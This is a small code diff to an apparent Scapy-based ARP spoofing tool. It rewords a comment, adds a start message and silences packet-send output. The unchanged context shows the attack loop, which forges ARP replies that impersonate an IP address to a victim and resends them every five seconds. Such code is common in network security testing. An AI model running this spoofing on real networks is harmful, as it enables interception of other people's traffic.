@@ -50,7 +50,7 @@ class ARPP(object):
             "select interface":self.select_interface}
     
     def _get_my_ip(self):
-        my_ip = get_if_addr(self.SELECTED_INTERFACE) # this is a string
+        my_ip = get_if_addr(self.SELECTED_INTERFACE) # this variable is a string
         return my_ip
     
     def _get_my_mac(self):
@@ -181,9 +181,10 @@ class ARPP(object):
         pkt[ARP].psrc  = ipToSpoof
         pkt[ARP].hwdst = macVictim
         pkt[ARP].pdst  = ipVictim
-            
+        
+        print("ARP spoofing started")
         while True:
-            sendp( pkt, iface=self.SELECTED_INTERFACE )
+            sendp( pkt, iface=self.SELECTED_INTERFACE, verbose=False )
             sleep(5)
 
 
